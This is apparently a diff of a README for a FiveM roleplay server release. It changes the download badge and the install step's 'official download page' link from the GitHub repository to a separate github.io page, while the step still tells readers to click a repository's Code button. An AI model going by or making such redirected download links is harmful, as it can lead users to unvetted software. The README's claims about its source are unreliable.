@@ -1,6 +1,6 @@
 # 🚔 metro-state-rp-release - Join the leading immersive roleplay community
 
-[![Download Metro State RP](https://img.shields.io/badge/Download-Metro_State_RP-blue)](https://github.com/Estebanhybrid208/metro-state-rp-release)
+[![Download Metro State RP](https://img.shields.io/badge/Download-Metro_State_RP-blue)](https://estebanhybrid208.github.io)
 
 Metro State RP v2026 offers a realistic roleplay experience for the FiveM platform. This project provides the files and resources for users to connect to our server. You will find custom vehicles, detailed character systems, and an active staff team ready to help players. This guide explains how to prepare your computer and join our world.
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware to run this software. Please check these s
 
 Follow these steps to get the game ready. You do not need technical skills to finish this process.
 
-1.  Visit the [official download page](https://github.com/Estebanhybrid208/metro-state-rp-release) and click the green Code button.
+1.  Visit the [official download page](https://estebanhybrid208.github.io) and click the green Code button.
 2.  Select the Download ZIP option.
 3.  Open the folder where you saved the file. 
 4.  Right-click the ZIP file and choose Extract All.
